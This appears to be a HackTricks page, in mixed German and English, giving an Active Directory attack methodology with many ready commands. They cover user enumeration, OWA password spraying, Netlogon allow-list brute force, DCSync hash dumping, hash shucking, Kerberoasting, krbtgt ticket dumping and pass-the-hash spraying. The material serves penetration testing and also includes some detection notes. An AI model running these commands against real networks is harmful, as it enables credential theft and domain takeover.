# Active Directory Methodology

{{#include ../../banners/hacktricks-training.md}}

## Basic overview

**Active Directory** dient als grundlegende Technologie und ermöglicht es **network administrators**, **domains**, **users** und **objects** innerhalb eines Netzwerks effizient zu erstellen und zu verwalten. Sie ist für Skalierung ausgelegt und erleichtert die Organisation einer großen Anzahl von Benutzern in handhabbare **groups** und **subgroups**, während **access rights** auf verschiedenen Ebenen kontrolliert werden.

Die Struktur von **Active Directory** besteht aus drei primären Ebenen: **domains**, **trees** und **forests**. Eine **domain** umfasst eine Sammlung von Objekten, wie **users** oder **devices**, die eine gemeinsame Datenbank teilen. **Trees** sind Gruppen dieser Domains, die durch eine gemeinsame Struktur verbunden sind, und ein **forest** repräsentiert die Sammlung mehrerer Trees, die durch **trust relationships** miteinander verbunden sind und die oberste Ebene der Organisationsstruktur bilden. Auf jeder dieser Ebenen können spezifische **access**- und **communication rights** festgelegt werden.

Zu den wichtigsten Konzepten in **Active Directory** gehören:

1. **Directory** – Enthält alle Informationen zu Active Directory-Objekten.
2. **Object** – Bezeichnet Entitäten innerhalb des Verzeichnisses, einschließlich **users**, **groups** oder **shared folders**.
3. **Domain** – Dient als Container für Verzeichnisobjekte, wobei mehrere Domains innerhalb eines **forest** nebeneinander bestehen können und jeweils ihre eigene Objektsammlung behalten.
4. **Tree** – Eine Gruppierung von Domains, die eine gemeinsame Root-Domain teilen.
5. **Forest** – Der Höhepunkt der Organisationsstruktur in Active Directory, bestehend aus mehreren Trees mit **trust relationships** zwischen ihnen.

**Active Directory Domain Services (AD DS)** umfasst eine Reihe von Diensten, die für die zentrale Verwaltung und Kommunikation innerhalb eines Netzwerks entscheidend sind. Diese Dienste umfassen:

1. **Domain Services** – Zentralisiert die Datenspeicherung und verwaltet Interaktionen zwischen **users** und **domains**, einschließlich **authentication**- und **search**-Funktionen.
2. **Certificate Services** – Überwacht die Erstellung, Verteilung und Verwaltung sicherer **digital certificates**.
3. **Lightweight Directory Services** – Unterstützt directory-fähige Anwendungen über das **LDAP protocol**.
4. **Directory Federation Services** – Bietet **single-sign-on**-Funktionen zur Authentifizierung von Benutzern über mehrere Webanwendungen in einer einzigen Sitzung.
5. **Rights Management** – Hilft beim Schutz urheberrechtlich geschützten Materials, indem die unbefugte Verteilung und Nutzung reguliert wird.
6. **DNS Service** – Entscheidend für die Auflösung von **domain names**.

Eine ausführlichere Erklärung findest du hier: [**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)

### **Kerberos Authentication**

Um zu lernen, wie man ein **AD attacken** kann, musst du den **Kerberos authentication process** sehr gut **verstehen**.\
[**Read this page if you still don't know how it works.**](kerberos-authentication.md)

## Cheat Sheet

You can take a lot to [https://wadcoms.github.io/](https://wadcoms.github.io) to have a quick view of which commands you can run to enumerate/exploit an AD.

> [!WARNING]
> Kerberos communication **requires a full qualifid name (FQDN)** for performing actions. If you try to access a machine by the IP address, **it'll use NTLM and not kerberos**.

## Recon Active Directory (No creds/sessions)

If you just have access to an AD environment but you don't have any credentials/sessions you could:

- **Pentest the network:**
- Scan the network, find machines and open ports and try to **exploit vulnerabilities** or **extract credentials** from them (for example, [printers could be very interesting targets](ad-information-in-printers.md).
- Enumerating DNS could give information about key servers in the domain as web, printers, shares, vpn, media, etc.
- `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
- Take a look to the General [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md) to find more information about how to do this.
- **Check for null and Guest access on smb services** (this won't work on modern Windows versions):
- `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
- `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
- A more detailed guide on how to enumerate a SMB server can be found here:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Enumerate Ldap**
- `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- A more detailed guide on how to enumerate LDAP can be found here (pay **special attention to the anonymous access**):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Poison the network**
- Gather credentials [**impersonating services with Responder**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
- Access host by [**abusing the relay attack**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)
- Gather credentials **exposing** [**fake UPnP services with evil-S**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**DP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
- Extract usernames/names from internal documents, social media, services (mainly web) inside the domain environments and also from the publicly available.
- If you find the complete names of company workers, you could try different AD **username conventions (**[**read this**](https://activedirectorypro.com/active-directory-user-naming-convention/)). The most common conventions are: _NameSurname_, _Name.Surname_, _NamSur_ (3letters of each), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, 3 _random letters and 3 random numbers_ (abc123).
- Tools:
- [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### User enumeration

- **Anonymous SMB/LDAP enum:** Check the [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) and [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md) pages.
- **Kerbrute enum**: When an **invalid username is requested** the server will respond using the **Kerberos error** code _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_, allowing us to determine that the username was invalid. **Valid usernames** will illicit either the **TGT in a AS-REP** response or the error _KRB5KDC_ERR_PREAUTH_REQUIRED_, indicating that the user is required to perform pre-authentication.
- **No Authentication against MS-NRPC**: Using auth-level = 1 (No authentication) against the MS-NRPC (Netlogon) interface on domain controllers. The method calls the `DsrGetDcNameEx2` function after binding MS-NRPC interface to check if the user or computer exists without any credentials. The [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) tool implements this type of enumeration. The research can be found [here](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **OWA (Outlook Web Access) Server**

Wenn du einen dieser Server im Netzwerk gefunden hast, kannst du auch **Benutzer-Enumeration dagegen** durchführen. Zum Beispiel könntest du das Tool [**MailSniper**](https://github.com/dafthack/MailSniper) verwenden:
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> Du kannst Listen von Benutzernamen in [**diesem github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names)  und in diesem hier ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)) finden.
>
> Allerdings solltest du den **Namen der Personen, die in der Firma arbeiten** aus dem Recon-Schritt haben, den du zuvor durchgeführt haben solltest. Mit Vor- und Nachname könntest du das Skript [**namemash.py**](https://gist.github.com/superkojiman/11076951) verwenden, um potenziell gültige Benutzernamen zu generieren.

### Netlogon vulnerable-channel allow-list abuse (Onelogon)

Auch nachdem **Zerologon** auf dem DC gepatcht wurde, können explizit allow-gelistete Konten weiterhin dem **Legacy/vulnerable Netlogon secure-channel behavior** ausgesetzt sein. Die riskante Konfiguration ist die GPO **`Domain controller: Allow vulnerable Netlogon secure channel connections`** oder der passende Registry-Wert **`HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\VulnerableChannelAllowList`**.

Dieser Wert ist ein **SDDL security descriptor** (siehe [Security Descriptors](security-descriptors.md)). Jedes Konto oder jede Gruppe, der der relevante ACE in der DACL gewährt wurde, kann Ziel sein. Zum Beispiel allow-listet `O:BAG:BAD:(A;;RC;;;WD)` effektiv **Everyone**.

Praktischer Operator-Workflow:

1. **Identifiziere allow-gelistete Principals** durch Prüfung von **SYSVOL/GPO** und der **laufenden DC Registry**.
2. **Resolve SIDs** aus dem SDDL zu echten AD-Benutzern/Computern und priorisiere **DC machine accounts**, **trust accounts** und andere privilegierte Maschinen.
3. Versuche wiederholt **MS-NRPC / Netlogon authentication** als das allow-gelistete Konto.
4. Nach einem erfolgreichen Guess missbrauche **Netlogon password-setting**, um das Passwort des Zielkontos zurückzusetzen (der öffentliche PoC setzt es auf einen leeren String).

Schnelle Triage-/Lab-Beispiele aus dem öffentlichen Artifact:
```bash
# Enumerate allow-listed accounts (scanner requires privileged registry access on the DC)
poetry run scan --dc-ip <DC_IP> --username <USER> --password <PASSWORD>

# Meet-in-the-middle attack against an allow-listed account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>'

# Faster 24-bit brute force when you control another computer account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>' \
--comp-username '<COMP_ACCOUNT>' --comp-pass '<COMP_PASSWORD>'
```
Notizen:

- Der **scanner** ist nützlich, weil die wirksame Allow-List in **SYSVOL**, in der **registry** oder in beidem vorhanden sein kann.
- Der Exploit-Pfad selbst ist wichtig, weil er nach der Identifizierung eines verwundbaren Accounts **keine Domain Admin privileges** erfordert.
- Das Kompromittieren eines **Domain Controller machine account** wie `DC$` ist besonders gefährlich, weil das Zurücksetzen dieses Passworts direkt breitere **AD takeover**-Pfade ermöglichen kann.
- Die **Brute-force feasibility** hängt vom Modus ab: Das öffentliche Artefakt beschreibt einen meet-in-the-middle-Ansatz, einen **24-bit** Brute Force, wenn ein anderer computer account verfügbar ist, und langsamere **32-bit**-Varianten.

Detection / hardening Notizen:

- Prüfe die Allow-List-Policy und entferne alles außer temporären, ausdrücklich erforderlichen Kompatibilitätsausnahmen.
- Überwache DC **System**-Events **5827/5828/5829/5830/5831**, um verwundbare Netlogon-Verbindungen zu erkennen, die durch Policy verweigert, entdeckt oder ausdrücklich erlaubt werden.
- Behandle Accounts in `VulnerableChannelAllowList` als **high-risk**, bis die Legacy-Abhängigkeit entfernt ist.

### Knowing one or several usernames

Ok, du weißt also bereits, dass du einen gültigen Username hast, aber keine Passwörter... Dann versuche:

- [**ASREPRoast**](asreproast.md): Wenn ein User das Attribut _DONT_REQ_PREAUTH_ **nicht hat**, kannst du eine **AS_REP message** für diesen User anfordern, die einige Daten enthält, die durch eine Ableitung des Passwords des Users verschlüsselt sind.
- [**Password Spraying**](password-spraying.md): Versuchen wir die **gängigsten Passwörter** mit jedem der entdeckten Users, vielleicht verwendet ein User ein schwaches Passwort (die password policy beachten!).
- Beachte, dass du auch **OWA servers** sprühen kannst, um Zugriff auf die Mailserver der Users zu erhalten.


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

Möglicherweise kannst du einige Challenge-**hashes** zum Cracken **erhalten**, indem du einige Protokolle des **networks** **poisoning**:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

Wenn es dir gelungen ist, das active directory zu enumerieren, hast du **mehr emails und ein besseres Verständnis des networks**. Möglicherweise kannst du NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) erzwingen, um Zugriff auf die AD env zu erhalten.

### NetExec workspace-driven recon & relay posture checks

- Verwende **`nxcdb` workspaces**, um den AD recon-Status pro Engagement zu verwalten: `workspace create <name>` startet pro Protokoll SQLite DBs unter `~/.nxc/workspaces/<name>` (smb/mssql/winrm/ldap/etc). Wechsle die Ansichten mit `proto smb|mssql|winrm` und liste gesammelte secrets mit `creds`. Sensible Daten danach manuell löschen: `rm -rf ~/.nxc/workspaces/<name>`.
- Schnelle subnet discovery mit **`netexec smb <cidr>`** zeigt **domain**, **OS build**, **SMB signing requirements** und **Null Auth**. Mitglieder mit `(signing:False)` sind **relay-prone**, während DCs oft signing erfordern.
- Erzeuge **hostnames in /etc/hosts** direkt aus der NetExec-Ausgabe, um das Targeting zu erleichtern:
```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```
- Wenn **SMB relay zum DC durch Signing blockiert** ist, prüfe trotzdem die **LDAP**-Einstellungen: `netexec ldap <dc>` hebt `(signing:None)` / schwaches Channel Binding hervor. Ein DC mit erforderlichem SMB Signing, aber deaktiviertem LDAP Signing, bleibt ein nutzbares **relay-to-LDAP**-Ziel für Missbrauch wie **SPN-less RBCD**.

### Client-seitige Printer-Credential-Leaks → bulk domain credential validation

- Printer/Web-UIs **betten manchmal maskierte Admin-Passwörter in HTML ein**. Im Quelltext/devtools kann Klartext sichtbar werden (z. B. `<input value="<password>">`), wodurch Basic-auth Zugriff auf Scan-/Print-Repositories ermöglicht wird.
- Abgerufene Print-Jobs können **plaintext onboarding docs** mit Passwörtern pro Benutzer enthalten. Beim Testen die Zuordnungen konsistent halten:
```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```
### Steal NTLM Creds

If you can **access other PCs or shares** with the **null or guest user** you could **place files** (like a SCF file) that if somehow accessed will t**rigger an NTLM authentication against you** so you can **steal** the **NTLM challenge** to crack it:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking** treats every NT hash you already possess as a candidate password for other, slower formats whose key material is derived directly from the NT hash. Instead of brute-forcing long passphrases in Kerberos RC4 tickets, NetNTLM challenges, or cached credentials, you feed the NT hashes into Hashcat’s NT-candidate modes and let it validate password reuse without ever learning the plaintext. This is especially potent after a domain compromise where you can harvest thousands of current and historical NT hashes.

Use shucking when:

- You have an NT corpus from DCSync, SAM/SECURITY dumps, or credential vaults and need to test for reuse in other domains/forests.
- You capture RC4-based Kerberos material (`$krb5tgs$23$`, `$krb5asrep$23$`), NetNTLM responses, or DCC/DCC2 blobs.
- You want to quickly prove reuse for long, uncrackable passphrases and immediately pivot via Pass-the-Hash.

The technique **does not work** against encryption types whose keys are not the NT hash (e.g., Kerberos etype 17/18 AES). If a domain enforces AES-only, you must revert to the regular password modes.

#### Building an NT hash corpus

- **DCSync/NTDS** – Use `secretsdump.py` with history to grab the largest possible set of NT hashes (and their previous values):

```bash
secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
```

History entries dramatically widen the candidate pool because Microsoft can store up to 24 previous hashes per account. For more ways to harvest NTDS secrets see:

{{#ref}}
dcsync.md
{{#endref}}

- **Endpoint cache dumps** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (or Mimikatz `lsadump::sam /patch`) extracts local SAM/SECURITY data and cached domain logons (DCC/DCC2). Deduplicate and append those hashes to the same `nt_candidates.txt` list.
- **Track metadata** – Keep the username/domain that produced each hash (even if the wordlist contains only hex). Matching hashes tell you immediately which principal is reusing a password once Hashcat prints the winning candidate.
- Prefer candidates from the same forest or a trusted forest; that maximizes the chance of overlap when shucking.

#### Hashcat NT-candidate modes

| Hash Type                                | Password Mode | NT-Candidate Mode |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

Notes:

- NT-candidate inputs **must remain raw 32-hex NT hashes**. Disable rule engines (no `-r`, no hybrid modes) because mangling corrupts the candidate key material.
- These modes are not inherently faster, but the NTLM keyspace (~30,000 MH/s on an M3 Max) is ~100× quicker than Kerberos RC4 (~300 MH/s). Testing a curated NT list is far cheaper than exploring the entire password space in the slow format.
- Always run the **latest Hashcat build** (`git clone https://github.com/hashcat/hashcat && make install`) because modes 31500/31600/35300/35400 shipped recently.
- There is currently no NT mode for AS-REQ Pre-Auth, and AES etypes (19600/19700) require the plaintext password because their keys are derived via PBKDF2 from UTF-16LE passwords, not raw NT hashes.

#### Example – Kerberoast RC4 (mode 35300)

1. Capture an RC4 TGS for a target SPN with a low-privileged user (see the Kerberoast page for details):

{{#ref}}
kerberoast.md
{{#endref}}

```bash
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
```

2. Shuck the ticket with your NT list:

```bash
hashcat -m 35300 roastable_TGS nt_candidates.txt
```

Hashcat derives the RC4 key from each NT candidate and validates the `$krb5tgs$23$...` blob. A match confirms that the service account uses one of your existing NT hashes.

3. Immediately pivot via PtH:

```bash
nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
```

You can optionally recover the plaintext later with `hashcat -m 1000 <matched_hash> wordlists/` if needed.

#### Example – Cached credentials (mode 31600)

1. Dump cached logons from a compromised workstation:

```bash
nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
```

2. Copy the DCC2 line for the interesting domain user into `dcc2_highpriv.txt` and shuck it:

```bash
hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
```

3. A successful match yields the NT hash already known in your list, proving that the cached user is reusing a password. Use it directly for PtH (`nxc smb <dc_ip> -u highpriv -H <hash>`) or brute-force it in fast NTLM mode to recover the string.

The exact same workflow applies to NetNTLM challenge-responses (`-m 27000/27100`) and DCC (`-m 31500`). Once a match is identified you can launch relay, SMB/WMI/WinRM PtH, or re-crack the NT hash with masks/rules offline.



## Enumerating Active Directory WITH credentials/session

For this phase you need to have **compromised the credentials or a session of a valid domain account.** If you have some valid credentials or a shell as a domain user, **you should remember that the options given before are still options to compromise other users**.

Before start the authenticated enumeration you should know what is the **Kerberos double hop problem.**


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumeration

Having compromised an account is a **big step to start compromising the whole domain**, because you are going to be able to start the **Active Directory Enumeration:**

Regarding [**ASREPRoast**](asreproast.md) you can now find every possible vulnerable user, and regarding [**Password Spraying**](password-spraying.md) you can get a **list of all the usernames** and try the password of the compromised account, empty passwords and new promising passwords.

- You could use the [**CMD to perform a basic recon**](../basic-cmd-for-pentesters.md#domain-info)
- You can also use [**powershell for recon**](../basic-powershell-for-pentesters/index.html) which will be stealthier
- You can also [**use powerview**](../basic-powershell-for-pentesters/powerview.md) to extract more detailed information
- Another amazing tool for recon in an active directory is [**BloodHound**](bloodhound.md). It is **not very stealthy** (depending on the collection methods you use), but **if you don't care** about that, you should totally give it a try. Find where users can RDP, find path to other groups, etc.
- **Other automated AD enumeration tools are:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- [**DNS records of the AD**](ad-dns-records.md) as they might contain interesting information.
- A **tool with GUI** that you can use to enumerate the directory is **AdExplorer.exe** from **SysInternal** Suite.
- You can also search in the LDAP database with **ldapsearch** to look for credentials in fields _userPassword_ & _unixUserPassword_, or even for _Description_. cf. [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) for other methods.
- If you are using **Linux**, you could also enumerate the domain using [**pywerview**](https://github.com/the-useless-one/pywerview).
- You could also try automated tools as:
- [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
- [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Extracting all domain users**

It's very easy to obtain all the domain usernames from Windows (`net user /domain` ,`Get-DomainUser` or `wmic useraccount get name,sid`). In Linux, you can use: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` or `enum4linux -a -u "user" -p "password" <DC IP>`

> Even if this Enumeration section looks small this is the most important part of all. Access the links (mainly the one of cmd, powershell, powerview and BloodHound), learn how to enumerate a domain and practice until you feel comfortable. During an assessment, this will be the key moment to find your way to DA or to decide that nothing can be done.

### Kerberoast

Kerberoasting involves obtaining **TGS tickets** used by services tied to user accounts and cracking their encryption—which is based on user passwords—**offline**.

More about this in:


{{#ref}}
kerberoast.md
{{#endref}}

### Remote connexion (RDP, SSH, FTP, Win-RM, etc)

Once you have obtained some credentials you could check if you have access to any **machine**. For that matter, you could use **CrackMapExec** to attempt connecting on several servers with different protocols, accordingly to your ports scans.

### Local Privilege Escalation

If you have compromised credentials or a session as a regular domain user and you have **access** with this user to **any machine in the domain** you should try to find your way to **escalate privileges locally and looting for credentials**. This is because only with local administrator privileges you will be able to **dump hashes of other users** in memory (LSASS) and locally (SAM).

There is a complete page in this book about [**local privilege escalation in Windows**](../windows-local-privilege-escalation/index.html) and a [**checklist**](../checklist-windows-privilege-escalation.md). Also, don't forget to use [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite).

### Current Session Tickets

It's very **unlikely** that you will find **tickets** in the current user **giving you permission to access** unexpected resources, but you could check:
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

Wenn du es geschafft hast, das active directory zu enumerieren, hast du **mehr emails und ein besseres Verständnis des Netzwerks**. Vielleicht kannst du NTLM-**relay attacks** erzwingen[**.**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)

### Looks for Creds in Computer Shares | SMB Shares

Jetzt, da du einige grundlegende Credentials hast, solltest du prüfen, ob du **irgendwelche interessanten Dateien finden** kannst, die **innerhalb des AD geteilt werden**. Du könntest das manuell machen, aber das ist eine sehr langweilige, repetitive Aufgabe (und noch mehr, wenn du Hunderte von Docs findest, die du prüfen musst).

[**Folge diesem Link, um mehr über Tools zu erfahren, die du verwenden könntest.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Steal NTLM Creds

Wenn du auf andere PCs oder Shares **zugreifen** kannst, könntest du **Files ablegen** (wie eine SCF-Datei), die, wenn sie irgendwie aufgerufen werden, eine **NTLM authentication gegen dich auslösen** könnten, sodass du den **NTLM challenge** **stehlen** kannst, um ihn zu cracken:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

Diese Vulnerability erlaubte jedem authentifizierten User, den **domain controller zu compromise**.


{{#ref}}
printnightmare.md
{{#endref}}

## Privilege escalation on Active Directory WITH privileged credentials/session

**Für die folgenden Techniken reicht ein normaler domain user nicht aus, du brauchst einige spezielle Privileges/Credentials, um diese attacks durchzuführen.**

### Hash extraction

Hoffentlich hast du es geschafft, ein **lokales Admin**-Account mit [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) inklusive relaying, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [Privilege escalation lokal](../windows-local-privilege-escalation/index.html) zu **compromise**n.\
Dann ist es Zeit, alle Hashes im Speicher und lokal zu dumpen.\
[**Lies diese Seite über verschiedene Wege, um die Hashes zu erhalten.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Sobald du den Hash eines Users hast**, kannst du ihn verwenden, um ihn zu **impersonate**n.\
Du musst ein **Tool** verwenden, das die **NTLM authentication using** genau diesen **Hash** ausführt, **oder** du könntest eine neue **sessionlogon** erstellen und diesen **Hash** in die **LSASS** **inject**en, sodass bei jeder **NTLM authentication** genau dieser **Hash** verwendet wird. Die letzte Option ist das, was mimikatz macht.\
[**Lies diese Seite für weitere Informationen.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

Dieser Angriff zielt darauf ab, den **user NTLM hash zu verwenden, um Kerberos tickets anzufordern**, als Alternative zum üblichen Pass The Hash über das NTLM-Protokoll. Daher könnte dies besonders **nützlich in Netzwerken sein, in denen das NTLM-Protokoll deaktiviert ist** und nur **Kerberos** als authentication protocol erlaubt ist.


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

Bei der Angriffsmethode **Pass The Ticket (PTT)** **stehlen Angreifer ein authentication ticket eines Users** statt dessen Passwort oder Hash-Werten. Dieses gestohlene Ticket wird dann verwendet, um den User zu **impersonate**n und unautorisierten Zugriff auf Ressourcen und Services innerhalb eines Netzwerks zu erhalten.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Credentials Reuse

Wenn du den **Hash** oder das **Passwort** eines **lokalen Administrators** hast, solltest du versuchen, dich damit **lokal** auf anderen **PCs** anzumelden.
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> Beachte, dass dies recht **laut** ist und **LAPS** dies **abmildern** würde.

### MSSQL Abuse & Trusted Links

Wenn ein Benutzer Berechtigungen hat, um auf **MSSQL-Instanzen zuzugreifen**, könnte er diese verwenden, um **Befehle auszuführen** auf dem MSSQL-Host (wenn es als SA läuft), den NetNTLM-**Hash zu stehlen** oder sogar einen **relay**-**attack** durchzuführen.\
Außerdem, wenn eine MSSQL-Instanz von einer anderen MSSQL-Instanz als vertrauenswürdig eingestuft wird (database link). Wenn der Benutzer Berechtigungen über die vertrauenswürdige Datenbank hat, kann er die **Vertrauensbeziehung verwenden, um auch in der anderen Instanz Abfragen auszuführen**. Diese Trusts können verkettet werden und irgendwann kann der Benutzer eine fehlkonfigurierte Datenbank finden, in der er Befehle ausführen kann.\
**Die Links zwischen Datenbanken funktionieren sogar über Forest Trusts hinweg.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### IT asset/deployment platforms abuse

Drittanbieter-Inventory- und Deployment-Suiten exponieren oft mächtige Wege zu Credentials und Code Execution. Siehe:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

Wenn du ein Computer-Objekt mit dem Attribut [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) findest und du Domain-Berechtigungen auf dem Computer hast, kannst du TGTs aus dem Speicher aller Benutzer dumpen, die sich am Computer anmelden.\
Wenn sich also ein **Domain Admin am Computer anmeldet**, kannst du sein TGT dumpen und ihn mit [Pass the Ticket](pass-the-ticket.md) impersonieren.\
Dank constrained delegation könntest du sogar einen **Print Server automatisch kompromittieren** (hoffentlich ist es ein DC).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

Wenn ein Benutzer oder Computer für "Constrained Delegation" erlaubt ist, kann er **jedem Benutzer vorgaukeln**, um auf bestimmte Dienste auf einem Computer zuzugreifen**.\
Wenn du dann den **Hash dieses Benutzers/Computers kompromittierst**, kannst du **jeden Benutzer impersonieren** (sogar domain admins), um auf einige Dienste zuzugreifen.


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

Wenn man das **WRITE**-Recht auf einem Active Directory-Objekt eines entfernten Computers hat, ermöglicht das das Erreichen von Code Execution mit **erhöhten Rechten**:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Permissions/ACLs Abuse

Der kompromittierte Benutzer könnte einige **interessante Berechtigungen über einige Domain-Objekte** haben, die es dir ermöglichen könnten, später **lateral zu bewegen**/**Privilegien zu eskalieren**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Printer Spooler service abuse

Das Entdecken eines **laufenden Spool-Dienstes** innerhalb der Domain kann **missbraucht** werden, um **neue Credentials zu erhalten** und **Privilegien zu eskalieren**.

